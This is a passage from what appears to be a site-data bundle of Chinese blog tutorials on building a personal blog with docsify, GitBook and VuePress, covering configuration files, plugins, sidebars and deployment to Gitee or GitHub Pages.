└──sw.js （博客系统的离线功能）\n  ├──node_modules （npm包安装所在）\n  ├──.gitignore （git忽略文件）\n  ├──package-lock.json （npm包管理文件）\n  ├──package.json （npm包管理文件）\n  └──README.md （本项目说明文件）\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n\n# docsify的基本配置\n\n * 配置都在docs的index.html中的window.$docsify对象里，添加字段就可以了，具体用什么可以去官网的“定制化-配置项”里进行查看。\n * 我使用的基本配置都在下面了，还有些配置可以外联script文件，为window.$docsify添加属性即可。\n\n<!DOCTYPE html>\n<html lang="en">\n\n<head>\n  <meta charset="UTF-8">\n  <title>Document</title>\n  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />\n  <meta name="description" content="Description">\n  <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0">\n  \x3c!-- 网站页签图标 --\x3e\n  <link rel="shortcut icon" href="public/image/favicon.ico" type="image/x-icon" />\n</head>\n\n<body>\n  <div id="app">亲，正在加载中，请稍等~</div>\n  <script>\n    window.$docsify = {\n      name: \'Liawn\\\'s blog\', // 左侧侧边栏最顶部的文字\n      repo: \'\', // 右上角的挂件（跳转链接）\n      el: \'#app\', // 欢迎页\n      coverpage: true, // 开启封面功能\n      loadSidebar: true, // 开启侧边栏功能\n      loadNavbar: true, // 开启导航栏功能\n      // 解决控制台404问题\n      alias: {\n        /* 使用自定义的侧边栏 */\n        \'/_sidebar.md\': \'/book-web/_sidebar.md\',\n        \'/book-web/.*/_sidebar.md\': \'/book-web/_sidebar.md\',\n        \'/book-sketches/.*/_sidebar.md\': \'/book-sketches/_sidebar.md\',\n        /* 使用自定义的侧边栏 */\n        \'/.*/_navbar.md\': \'/_navbar.md\'\n      },\n      relativePath: true, // 启用相对路径\n      topMargin: 55, // 让你的内容页在滚动到指定的锚点时，距离页面顶部有一定空间\n      mergeNavbar: true,  // 小屏设备下合并导航栏到侧边栏\n      auto2top: true, // 切换页面后是否自动跳转到页面顶部\n      onlyCover: true, // 让封面单独出现，封面滑动在移动端效果并不好，所有固定onlyCover为true\n      // search.min.js插件\n      search: {\n        maxAge: 86400000, // 过期时间，单位毫秒，默认一天\n        paths: \'auto\', // or \'auto\'\n        placeholder: \'搜索\',\n        noData: \'没有搜索到相应的结果\',\n        // 搜索标题的最大层级, 1 - 6\n        depth: 6,\n      },\n      // docsify-tabs插件\n      tabs: {\n        persist: true,\n        sync: true,\n        theme: \'material\',\n        tabComments: true,\n        tabHeadings: true\n      },\n    }\n    // 离线也能查看\n    if (typeof navigator.serviceWorker !== \'undefined\') {\n      navigator.serviceWorker.register(\'sw.js\')\n    }\n  <\/script>\n  \x3c!-- Docsify v4 --\x3e\n  <script src="//cdn.jsdelivr.net/npm/docsify@4"><\/script>\n  \x3c!-- 解析xxx类型的code展示面板，至于样式还是得自己加 --\x3e\n  <script src=" //cdn.jsdelivr.net/npm/prismjs@1/components/prism-typescript.min.js"><\/script>\n  <script src="//cdn.jsdelivr.net/npm/prismjs@1/components/prism-jsx.min.js"><\/script>\n  <script src="//cdn.jsdelivr.net/npm/prismjs@1/components/prism-json.min.js"><\/script>\n  \x3c!-- 全文搜索 --\x3e\n  <script src="//cdn.jsdelivr.net/npm/docsify/lib/plugins/search.min.js"><\/script>\n  \x3c!-- 代码复制 --\x3e\n  <script src="//cdn.jsdelivr.net/npm/docsify-copy-code/dist/docsify-copy-code.min.js"><\/script>\n  \x3c!-- 底部分页 --\x3e\n  <script src="//cdn.jsdelivr.net/npm/docsify-pagination/dist/docsify-pagination.min.js"><\/script>\n  \x3c!-- 标签展示 --\x3e\n  <script src="//cdn.jsdelivr.net/npm/docsify-tabs@1"><\/script>\n  \x3c!-- theme-liawn主题 //cdn.jsdelivr.net/gh/用户名/仓库名@版本/文件夹/文件名 --\x3e\n  <script src="//cdn.jsdelivr.net/gh/liawnliu/docsify-theme-liawn@v1.2.0/dist/theme-liawn.min.js"><\/script>\n</body>\n\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n\n\n\n# 封面的使用\n\n * 封面就是跳转到你博客/书籍的链接，它在“加载中”提示完后的第一个展示的模块，docsify官网一开始那个可爱LOG和绿色背景就是封面。\n\n * 使用封面首先将配置项coverpage置为true，或者将coverpage改为你“封面.md”的链接位置，例如：coverpage: \'_coverpage.md\'。\n\n * 在docs目录下新建一个_coverpage.md，docsify会解析它生成封面；里面有博客名、大LOGO、两个按钮、背景图或背景色。\n\n * _coverpage.md示例：\n   \n   # xxx\\\'s blog\n   \n   > xxxxxxxxxxxx.\n   \n   - 目前xxxxxx\n   - 本博客由Docsify和Gitee Pages搭建而成\n   \n   [Gitee](https://gitee.com/xxx)\n   [Get Started](/book-xxx/?id=功能说明)\n   \n   ![背景](public/image/bg.png)\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   9\n   10\n   11\n   \n\n\n# 导航栏的使用\n\n * 导航栏就是博客顶部的模块，会显示“入门”、“指南”、“了解更多”等按钮，目前是跟着文档的滚动而滚动的，也可以自己调整一下。\n\n * 使用导航栏首先将配置loadNavbar置为true，或者将loadNavbar改为你“导航栏.md”的链接位置，例如：loadNavbar: \'_navbar.md\'。\n\n * 在docs目录下创建一个_navbar.md，docsify会解析它生成导航栏；当然也可以直接在index.html的body中添加nav或者div标签，给它在添加a便签用以跳转你的“入门”之类的。\n\n * _navbar.md示例：\n   \n   * [Web部分](/book-web/)\n   * [生活](/book-sketches/)\n   \n   \n   1\n   2\n   \n\n\n# 侧边栏的使用\n\n * 左侧侧边栏就是整个书籍或者文档的目录，顶部可以是搜索栏和博客总标题“xxx的博客”，底部是侧边栏收缩按钮。\n\n * 侧边栏的使用首先是loadSidebar配置项置为true，然后在根目录下创建_sidebar.md文件，文件内容例如：\n   \n     * 常用工具  \n         * [Git的使用](/book-web/常用工具/Git的使用.md)  \n         * [使用gitbook写blog](/book-web/常用工具/使用gitbook写blog.md)  \n         * [使用docsify写blog](/book-web/常用工具/使用docsify写blog.md)  \n   \n   \n   1\n   2\n   3\n   4\n   \n\n * docsify会根据_sidebar.md生成侧边栏里的目录，多级目录就是ul-li的写法，也就是在_sidebar.md里将内容（标题）多使用一个tab缩进。\n\n * 左侧侧边栏没有章节折叠功能，自己写了一个折叠功能在theme-liawn.js里，其实就是根据docsify现有的折叠功能class="collapse"和class="app-sub-sidebar"来实现的。\n\n\n# 插件的使用\n\n * docsify基本功能其实够用了，使用插件可以更方便的阅读博客/书籍。插件可以直接使用cdn引进到index.html里，非常便捷，但是可能影响到你的博客/书籍加载速度，当然你也直接将插件下载到你的项目里再部署到网站上。\n * 目前使用的插件：\n   * 全文搜索插件search，用在左侧侧边栏顶部\n   * 复制代码插件docsify-copy-code，用在文章正文中。\n   * 分页导航插件docsify-pagination，用在文章底部。\n   * 页签插件docsify-tabs。\n   * 自己做了一个主题docsify-theme-liawn，增加了一个固定的header在顶部，将博客名、搜索栏、导航栏都放到了header里；给左侧侧边栏增加了折叠功能；新增右侧侧边栏，作为当前文章的目录（不显示在左侧侧边栏了）。\n * 其他插件可以去这个网站上查看：https://github.com/docsifyjs/awesome-docsify\n\n\n# 部署博客/书籍\n\n    因为有静态的index.html，直接上传到Gitee或GitHub上，在该项目的“服务”或“设置”里找到“Pages”，选择好你的分支和目录（index.html所在目录）就可以部署了，一键部署非常便捷。\n\n\n# 常见问题\n\n 1. 文件404问题：Git是默认忽略大小写问题的，修改文件夹的大小写上传到Git远程代码库，将这个远程代码库的build部分部署到服务器上，在访问修改文件夹下的文件时会出现404问题。解决方案：打开本地项目的.git目录下的config文件，修改里面的ignorecase选项为false。\n 2. Markdown All in One插件创建的目录，如果标题是以数字开头的，在docsify上点击时会报错，两方不兼容，所以隐藏了Markdown All in One生成的目录，只用我们的右侧侧边栏作为当前文章的目录。',normalizedContent:'# 使用docsify写blog\n\n\n# 为什么使用docsify\n\n * docsify只需要一个index.html静态文件，不会再生成多余的静态文件，非常简便。\n * 插件可以直接使用cdn，也可以将插件相关的js、css、images直接放到项目下，无需npm下载。\n * 配置简单，也足以支撑最简单的文档网页，自己操作空间很大。\n\n\n# docsify的使用\n\n * 在一个完全新的项目里使用docsify，比如是个空的blog项目：\n   \n   1. 使用npm：首先得会使用npm，查看之前写的“npm的使用”。\n   \n   2. 初始化新项目：使用git init和npm init来初始化新项目，会生成.git和package.json。\n   \n   3. 局部安装docsify：运行npm i docsify-cli局部安装docsify，再编辑package.json里的scripts如下。\n      \n      {\n          // 添加npm运行脚本\n          "scripts": {\n            "init": "docsify init ./docs",\n            "dev": "docsify serve ./docs"\n          },\n      }\n      \n      \n      1\n      2\n      3\n      4\n      5\n      6\n      7\n      \n   \n   4. 使用docsify初始化docs：运行npm run init，docsify就会在新项目里生成docs文件夹，该文件夹里有index.html、.nojekyll和readme.md。\n   \n   5. 使用docsify预览docs内容：运行npm run dev，就能看到docs文件夹里的内容（最初是docs/readme.md）显示在了http://localhost:3000里。\n   \n   6. 新增.gitignore：给这个新项目新增.gitignore文件，在里面添加node_modules、.git、.vscode等。\n\n * 如果是在现有项目里使用docsify，也就是给现有项目新增docs说明文档，或者改造docs说明文档：\n   \n   1. 因为是现有项目，新建一个分支，不用使用git init和npm init来初始化现有项目了。如果是改造docs说明文档，那就将现有项目这个新分支里的docs文件夹剪切到外面进行一个备份。\n   \n   2. 局部安装docsify：运行npm i docsify-cli会在现有项目新分支下局部安装docsify，再编辑package.json里的scripts如下。\n      \n      {\n          // 添加npm运行脚本，除了npm和git以外，所有的blog相关的都在docs目录下\n          "scripts": {\n            "init": "docsify init ./docs",\n            "dev": "docsify serve ./docs"\n          },\n      }\n      \n      \n      1\n      2\n      3\n      4\n      5\n      6\n      7\n      \n   \n   3. 使用docsify初始化docs：运行npm run init，docsify会在现有项目新分支下生成docs文件夹，该文件夹里有index.html、.nojekyll和readme.md。\n   \n   4. 使用docsify预览docs内容：运行npm run dev，就能看到docs文件夹里的内容（最初是docs/readme.md）显示在了http://localhost:3000里。\n   \n   5. 修改.gitignore：修改现有项目的.gitignore文件，在里面添加node_modules、.git、.vscode等。\n   \n   6. 准备在这个项目的docs里写项目说明，或者是将之前备份的docs里的内容移到现在的新docs里。\n\n\n# 期望的项目目录结构\n\nprojectname（例如blog，也可以是xxx-react，只要保证docs是真正的文档入口目录即可）\n  ├──docs （docsify作用于这个文件夹，也是部署在github pages上的目录）\n  │   ├──book-sketches （自定义博客内容，例如生活部分）\n  │   │       └──_sidebar.md （book-sketches里所有md文件组成的目录）\n  │   ├──book-web （自定义博客内容，例如web部分）\n  │   │       └──_sidebar.md （book-web里所有md文件组成的目录）\n  │   ├──public （存放博客系统的公共资源，也可以放本地插件）\n  │   │   ├──image （博客系统的公共图片资源）\n  │   │   │   ├──bg.png （封面背景图）\n  │   │   │   └──favicon.ico （网站页签图标icon）\n  │   │   └──library （插件虽然是cdn形式，以防万一，在本地存一份）\n  │   ├──_coverpage.md （博客系统的封面）\n  │   ├──_navbar.md （博客系统的导航栏）\n  │   ├──.nojekyll （解决名字为下划线开头的文件在github上的报错）\n  │   ├──index.html （博客系统的入口文件，存放一些配置，引入一些插件等）\n  │   ├──readme.md （博客系统的homepage主页）\n  │   └──sw.js （博客系统的离线功能）\n  ├──node_modules （npm包安装所在）\n  ├──.gitignore （git忽略文件）\n  ├──package-lock.json （npm包管理文件）\n  ├──package.json （npm包管理文件）\n  └──readme.md （本项目说明文件）\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n\n# docsify的基本配置\n\n * 配置都在docs的index.html中的window.$docsify对象里，添加字段就可以了，具体用什么可以去官网的“定制化-配置项”里进行查看。\n * 我使用的基本配置都在下面了，还有些配置可以外联script文件，为window.$docsify添加属性即可。\n\n<!doctype html>\n<html lang="en">\n\n<head>\n  <meta charset="utf-8">\n  <title>document</title>\n  <meta http-equiv="x-ua-compatible" content="ie=edge,chrome=1" />\n  <meta name="description" content="description">\n  <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0">\n  \x3c!-- 网站页签图标 --\x3e\n  <link rel="shortcut icon" href="public/image/favicon.ico" type="image/x-icon" />\n</head>\n\n<body>\n  <div id="app">亲，正在加载中，请稍等~</div>\n  <script>\n    window.$docsify = {\n      name: \'liawn\\\'s blog\', // 左侧侧边栏最顶部的文字\n      repo: \'\', // 右上角的挂件（跳转链接）\n      el: \'#app\', // 欢迎页\n      coverpage: true, // 开启封面功能\n      loadsidebar: true, // 开启侧边栏功能\n      loadnavbar: true, // 开启导航栏功能\n      // 解决控制台404问题\n      alias: {\n        /* 使用自定义的侧边栏 */\n        \'/_sidebar.md\': \'/book-web/_sidebar.md\',\n        \'/book-web/.*/_sidebar.md\': \'/book-web/_sidebar.md\',\n        \'/book-sketches/.*/_sidebar.md\': \'/book-sketches/_sidebar.md\',\n        /* 使用自定义的侧边栏 */\n        \'/.*/_navbar.md\': \'/_navbar.md\'\n      },\n      relativepath: true, // 启用相对路径\n      topmargin: 55, // 让你的内容页在滚动到指定的锚点时，距离页面顶部有一定空间\n      mergenavbar: true,  // 小屏设备下合并导航栏到侧边栏\n      auto2top: true, // 切换页面后是否自动跳转到页面顶部\n      onlycover: true, // 让封面单独出现，封面滑动在移动端效果并不好，所有固定onlycover为true\n      // search.min.js插件\n      search: {\n        maxage: 86400000, // 过期时间，单位毫秒，默认一天\n        paths: \'auto\', // or \'auto\'\n        placeholder: \'搜索\',\n        nodata: \'没有搜索到相应的结果\',\n        // 搜索标题的最大层级, 1 - 6\n        depth: 6,\n      },\n      // docsify-tabs插件\n      tabs: {\n        persist: true,\n        sync: true,\n        theme: \'material\',\n        tabcomments: true,\n        tabheadings: true\n      },\n    }\n    // 离线也能查看\n    if (typeof navigator.serviceworker !== \'undefined\') {\n      navigator.serviceworker.register(\'sw.js\')\n    }\n  <\/script>\n  \x3c!-- docsify v4 --\x3e\n  <script src="//cdn.jsdelivr.net/npm/docsify@4"><\/script>\n  \x3c!-- 解析xxx类型的code展示面板，至于样式还是得自己加 --\x3e\n  <script src=" //cdn.jsdelivr.net/npm/prismjs@1/components/prism-typescript.min.js"><\/script>\n  <script src="//cdn.jsdelivr.net/npm/prismjs@1/components/prism-jsx.min.js"><\/script>\n  <script src="//cdn.jsdelivr.net/npm/prismjs@1/components/prism-json.min.js"><\/script>\n  \x3c!-- 全文搜索 --\x3e\n  <script src="//cdn.jsdelivr.net/npm/docsify/lib/plugins/search.min.js"><\/script>\n  \x3c!-- 代码复制 --\x3e\n  <script src="//cdn.jsdelivr.net/npm/docsify-copy-code/dist/docsify-copy-code.min.js"><\/script>\n  \x3c!-- 底部分页 --\x3e\n  <script src="//cdn.jsdelivr.net/npm/docsify-pagination/dist/docsify-pagination.min.js"><\/script>\n  \x3c!-- 标签展示 --\x3e\n  <script src="//cdn.jsdelivr.net/npm/docsify-tabs@1"><\/script>\n  \x3c!-- theme-liawn主题 //cdn.jsdelivr.net/gh/用户名/仓库名@版本/文件夹/文件名 --\x3e\n  <script src="//cdn.jsdelivr.net/gh/liawnliu/docsify-theme-liawn@v1.2.0/dist/theme-liawn.min.js"><\/script>\n</body>\n\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n\n\n\n# 封面的使用\n\n * 封面就是跳转到你博客/书籍的链接，它在“加载中”提示完后的第一个展示的模块，docsify官网一开始那个可爱log和绿色背景就是封面。\n\n * 使用封面首先将配置项coverpage置为true，或者将coverpage改为你“封面.md”的链接位置，例如：coverpage: \'_coverpage.md\'。\n\n * 在docs目录下新建一个_coverpage.md，docsify会解析它生成封面；里面有博客名、大logo、两个按钮、背景图或背景色。\n\n * _coverpage.md示例：\n   \n   # xxx\\\'s blog\n   \n   > xxxxxxxxxxxx.\n   \n   - 目前xxxxxx\n   - 本博客由docsify和gitee pages搭建而成\n   \n   [gitee](https://gitee.com/xxx)\n   [get started](/book-xxx/?id=功能说明)\n   \n   ![背景](public/image/bg.png)\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   9\n   10\n   11\n   \n\n\n# 导航栏的使用\n\n * 导航栏就是博客顶部的模块，会显示“入门”、“指南”、“了解更多”等按钮，目前是跟着文档的滚动而滚动的，也可以自己调整一下。\n\n * 使用导航栏首先将配置loadnavbar置为true，或者将loadnavbar改为你“导航栏.md”的链接位置，例如：loadnavbar: \'_navbar.md\'。\n\n * 在docs目录下创建一个_navbar.md，docsify会解析它生成导航栏；当然也可以直接在index.html的body中添加nav或者div标签，给它在添加a便签用以跳转你的“入门”之类的。\n\n * _navbar.md示例：\n   \n   * [web部分](/book-web/)\n   * [生活](/book-sketches/)\n   \n   \n   1\n   2\n   \n\n\n# 侧边栏的使用\n\n * 左侧侧边栏就是整个书籍或者文档的目录，顶部可以是搜索栏和博客总标题“xxx的博客”，底部是侧边栏收缩按钮。\n\n * 侧边栏的使用首先是loadsidebar配置项置为true，然后在根目录下创建_sidebar.md文件，文件内容例如：\n   \n     * 常用工具  \n         * [git的使用](/book-web/常用工具/git的使用.md)  \n         * [使用gitbook写blog](/book-web/常用工具/使用gitbook写blog.md)  \n         * [使用docsify写blog](/book-web/常用工具/使用docsify写blog.md)  \n   \n   \n   1\n   2\n   3\n   4\n   \n\n * docsify会根据_sidebar.md生成侧边栏里的目录，多级目录就是ul-li的写法，也就是在_sidebar.md里将内容（标题）多使用一个tab缩进。\n\n * 左侧侧边栏没有章节折叠功能，自己写了一个折叠功能在theme-liawn.js里，其实就是根据docsify现有的折叠功能class="collapse"和class="app-sub-sidebar"来实现的。\n\n\n# 插件的使用\n\n * docsify基本功能其实够用了，使用插件可以更方便的阅读博客/书籍。插件可以直接使用cdn引进到index.html里，非常便捷，但是可能影响到你的博客/书籍加载速度，当然你也直接将插件下载到你的项目里再部署到网站上。\n * 目前使用的插件：\n   * 全文搜索插件search，用在左侧侧边栏顶部\n   * 复制代码插件docsify-copy-code，用在文章正文中。\n   * 分页导航插件docsify-pagination，用在文章底部。\n   * 页签插件docsify-tabs。\n   * 自己做了一个主题docsify-theme-liawn，增加了一个固定的header在顶部，将博客名、搜索栏、导航栏都放到了header里；给左侧侧边栏增加了折叠功能；新增右侧侧边栏，作为当前文章的目录（不显示在左侧侧边栏了）。\n * 其他插件可以去这个网站上查看：https://github.com/docsifyjs/awesome-docsify\n\n\n# 部署博客/书籍\n\n    因为有静态的index.html，直接上传到gitee或github上，在该项目的“服务”或“设置”里找到“pages”，选择好你的分支和目录（index.html所在目录）就可以部署了，一键部署非常便捷。\n\n\n# 常见问题\n\n 1. 文件404问题：git是默认忽略大小写问题的，修改文件夹的大小写上传到git远程代码库，将这个远程代码库的build部分部署到服务器上，在访问修改文件夹下的文件时会出现404问题。解决方案：打开本地项目的.git目录下的config文件，修改里面的ignorecase选项为false。\n 2. markdown all in one插件创建的目录，如果标题是以数字开头的，在docsify上点击时会报错，两方不兼容，所以隐藏了markdown all in one生成的目录，只用我们的右侧侧边栏作为当前文章的目录。',charsets:{cjk:!0}},{title:"使用gitbook写blog",frontmatter:{},regularPath:"/book-web/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/%E4%BD%BF%E7%94%A8gitbook%E5%86%99blog.html",relativePath:"book-web/常用工具/使用gitbook写blog.md",key:"v-ed5b9394",path:"/book-web/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/%E4%BD%BF%E7%94%A8gitbook%E5%86%99blog.html",headers:[{level:2,title:"了解GitBook",slug:"了解gitbook",normalizedTitle:"了解gitbook",charIndex:21},{level:2,title:"环境搭建",slug:"环境搭建",normalizedTitle:"环境搭建",charIndex:179},{level:2,title:"配置book.json",slug:"配置book-json",normalizedTitle:"配置book.json",charIndex:423},{level:2,title:"使用GitBook",slug:"使用gitbook",normalizedTitle:"使用gitbook",charIndex:1244},{level:2,title:"常见问题",slug:"常见问题",normalizedTitle:"常见问题",charIndex:1598}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"了解GitBook 环境搭建 配置book.json 使用GitBook 常见问题",content:'# 使用gitbook写blog\n\n\n# 了解GitBook\n\n    GitBook是一款基于Node.js的文档编写工具，支持Markdown和AsciiDoc文档格式，并且可以将这些文档组织成一本书的形式。与Git搭配更容易管理文档，当然也可以使用GitHub的Pages来部署你的“书”。这样就可以尽情的使用这一套流程来充实你的个人博客啦！\n\n\n# 环境搭建\n\n 1. 之前有写过Npm的使用，简单来说就是先下载安装Node.js，已安装Node.js的就直接安装GitBook，Node.js安装完后使用两条命令检查一下：node --version 和 npm --version\n    \n 2. 全局安装GitBook，命令是 npm install gitbook-cli -g\n 3. 然后在当前目录下创建一本书，命令是 gitbook init，会生成README和SUMMARY，一个是说明文档，一个是书的目录。\n\n\n# 配置book.json\n\n * 常规设置：\n\n变量            说明\nroot          包含所有图书文件的根文件夹的路径，除了book.json\nstructure     指定自述，摘要，词汇表等的路径。\ntitle         书的标题，默认值从README中提取。在GitBook.com上，此字段已预填。\ndescription   您的图书说明，默认值从自述文件中提取。在GitBook.com上，此字段已预填。\nauthor        作者姓名。在GitBook.com上，此字段已预填。\nisbn          书的国际码ISBN\nlanguage      语言ISO规范的书的语言，默认值是en\ndirection     文本的方向。可以是rtl或ltr，默认值取决于language 的值\ngitbook       GitBook的版本。使用SemVer规范并接受诸如“> = 3.0.0”的条件\n\n * 常用插件：\n   * "chapter-fold"：左侧目录折叠。\n   * "code"：代码块的行数和复制按钮。\n   * "search-pro"：高级搜索（含中文），需要去掉默认插件即"-lunr"和"-search"。\n   * "splitter"：侧边栏宽度可调节。\n   * "sharing-plus"：分享。\n   * "pageview-count"：阅读量计数。\n   * "lightbox"：当前页将图打开放大显示。\n   * "theme-fexa": 定制化主题。\n   * "anchor-navigation-ex"：悬浮的“目录”和“返回顶部”。\n\n    配置好后使用 gitbook install 命令进行插件安装。参考链接https://www.cnblogs.com/mingyue5826/p/10307051.html\n\n\n# 使用GitBook\n\n 1. 预览这本书可以使用 gitbook serve 先本地编译，再通过日志里它给的地址去预览这本书\n    \n 2. 在项目中编写你的md文档，如果想要将它添加到书里并显示，那么在SUMMARY.md文档中合适的位置新增一个“标题”（使用md的链接语法），再使用 gitbook serve 命令进行编译（只要修改了就要重新编译），并打开地址去预览新的内容。\n 3. 部署到线上作为自己的个人博客。先使用 gitbook build 对书进行打包，会生成_book文件夹。可以使用GitHub和Gitee的Pages进行部署。例如使用Gitee，进入线上仓库（部署的位置），依次点击“服务”-“Gitee Pages”，然后选择好你要部署的分支和目录（_book文件夹）。\n\n\n# 常见问题\n\n 1. 文件404问题：Git是默认忽略大小写问题的，修改文件夹的大小写上传到Git远程代码库，将这个远程代码库的build部分部署到服务器上，在访问修改文件夹下的文件时会出现404问题。解决方案：打开本地项目的.git目录下的config文件，修改里面的ignorecase选项为false。\n 2. 其他问题可以通过服务器上的文件与本地文件对比找出解决方案。',normalizedContent:'# 使用gitbook写blog\n\n\n# 了解gitbook\n\n    gitbook是一款基于node.js的文档编写工具，支持markdown和asciidoc文档格式，并且可以将这些文档组织成一本书的形式。与git搭配更容易管理文档，当然也可以使用github的pages来部署你的“书”。这样就可以尽情的使用这一套流程来充实你的个人博客啦！\n\n\n# 环境搭建\n\n 1. 之前有写过npm的使用，简单来说就是先下载安装node.js，已安装node.js的就直接安装gitbook，node.js安装完后使用两条命令检查一下：node --version 和 npm --version\n    \n 2. 全局安装gitbook，命令是 npm install gitbook-cli -g\n 3. 然后在当前目录下创建一本书，命令是 gitbook init，会生成readme和summary，一个是说明文档，一个是书的目录。\n\n\n# 配置book.json\n\n * 常规设置：\n\n变量            说明\nroot          包含所有图书文件的根文件夹的路径，除了book.json\nstructure     指定自述，摘要，词汇表等的路径。\ntitle         书的标题，默认值从readme中提取。在gitbook.com上，此字段已预填。\ndescription   您的图书说明，默认值从自述文件中提取。在gitbook.com上，此字段已预填。\nauthor        作者姓名。在gitbook.com上，此字段已预填。\nisbn          书的国际码isbn\nlanguage      语言iso规范的书的语言，默认值是en\ndirection     文本的方向。可以是rtl或ltr，默认值取决于language 的值\ngitbook       gitbook的版本。使用semver规范并接受诸如“> = 3.0.0”的条件\n\n * 常用插件：\n   * "chapter-fold"：左侧目录折叠。\n   * "code"：代码块的行数和复制按钮。\n   * "search-pro"：高级搜索（含中文），需要去掉默认插件即"-lunr"和"-search"。\n   * "splitter"：侧边栏宽度可调节。\n   * "sharing-plus"：分享。\n   * "pageview-count"：阅读量计数。\n   * "lightbox"：当前页将图打开放大显示。\n   * "theme-fexa": 定制化主题。\n   * "anchor-navigation-ex"：悬浮的“目录”和“返回顶部”。\n\n    配置好后使用 gitbook install 命令进行插件安装。参考链接https://www.cnblogs.com/mingyue5826/p/10307051.html\n\n\n# 使用gitbook\n\n 1. 预览这本书可以使用 gitbook serve 先本地编译，再通过日志里它给的地址去预览这本书\n    \n 2. 在项目中编写你的md文档，如果想要将它添加到书里并显示，那么在summary.md文档中合适的位置新增一个“标题”（使用md的链接语法），再使用 gitbook serve 命令进行编译（只要修改了就要重新编译），并打开地址去预览新的内容。\n 3. 部署到线上作为自己的个人博客。先使用 gitbook build 对书进行打包，会生成_book文件夹。可以使用github和gitee的pages进行部署。例如使用gitee，进入线上仓库（部署的位置），依次点击“服务”-“gitee pages”，然后选择好你要部署的分支和目录（_book文件夹）。\n\n\n# 常见问题\n\n 1. 文件404问题：git是默认忽略大小写问题的，修改文件夹的大小写上传到git远程代码库，将这个远程代码库的build部分部署到服务器上，在访问修改文件夹下的文件时会出现404问题。解决方案：打开本地项目的.git目录下的config文件，修改里面的ignorecase选项为false。\n 2. 其他问题可以通过服务器上的文件与本地文件对比找出解决方案。',charsets:{cjk:!0}},{title:"使用vuepress写blog",frontmatter:{},regularPath:"/book-web/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/%E4%BD%BF%E7%94%A8vuepress%E5%86%99blog.html",relativePath:"book-web/常用工具/使用vuepress写blog.md",key:"v-68cece76",path:"/book-web/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/%E4%BD%BF%E7%94%A8vuepress%E5%86%99blog.html",headers:[{level:2,title:"为什么使用vuepress",slug:"为什么使用vuepress",normalizedTitle:"为什么使用vuepress",charIndex:22},{level:2,title:"vuepress的安装",slug:"vuepress的安装",normalizedTitle:"vuepress的安装",charIndex:176},{level:2,title:"大致目录结构",slug:"大致目录结构",normalizedTitle:"大致目录结构",charIndex:1009},{level:2,title:"设置首页",slug:"设置首页",normalizedTitle:"设置首页",charIndex:2086},{level:2,title:"vuepress的基本配置",slug:"vuepress的基本配置",normalizedTitle:"vuepress的基本配置",charIndex:2651},{level:2,title:"侧边栏",slug:"侧边栏",normalizedTitle:"侧边栏",charIndex:3697},{level:2,title:"编译部署",slug:"编译部署",normalizedTitle:"编译部署",charIndex:7091},{level:2,title:"常见问题",slug:"常见问题",normalizedTitle:"常见问题",charIndex:7754}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"为什么使用vuepress vuepress的安装 大致目录结构 设置首页 vuepress的基本配置 侧边栏 编译部署 常见问题",content:"# 使用vuepress写blog\n\n\n# 为什么使用vuepress\n\nVuePress是Vue前端框架团队推出的一款静态网站生成器，它的优势就在于它是Vue官方背书。即使是Docsify它也是使用的Vue技术，所以我们何不直接使用VuePress呢。还有Docsify是运行时驱动，而VuePress提前生成静态内容，在SEO上会好一些。\n\n\n# vuepress的安装\n\n * npm的使用：首先得会使用npm，查看之前写的“Npm的使用”。\n\n * vuepress官网：可以跟着VuePress官网来学习使用。\n\n * 初始化项目：准备一个新项目的空文件夹（也可以对现有项目的docs进行改造，记得先备份docs里的内容），在空文件夹下使用npm init（yarn init）来初始化blog项目（需要上传代码可以使用git init）。\n\n * 安装vuepress：在新项目下（或者现有项目docs的根目录下），运行npm install -D vuepress（yarn add -D vuepress）局部安装vuepress，再编辑package.json的scripts如下。\n   \n   {\n       // 添加npm运行脚本\n       \"scripts\": {\n           \"dev\": \"vuepress dev docs\",\n           \"build\": \"vuepress build docs\"\n       },\n   }\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   \n\n * 预览项目：运行npm run dev，打开http://localhost:8080/，如果发现404问题，可以在项目的docs下新建一个README.md，docs就是存放博客的地方，它的README.md会成为根路由的渲染页面。\n\n * 新增.gitignore：在这个.gitignore文件里添加node_modules、.git、.vscode、.temp、.cache等。\n\n * 迁移博客：在初始化时提过如果是迁移就新建分支，并清空所有内容。原因是docs文件夹里如果存有之前的博客内容，那么vuepress可能会编译报错，就需要先将这些博客内容暂时剪切到外面，等下一小节配置的时候再移进来慢慢修改。\n\n\n# 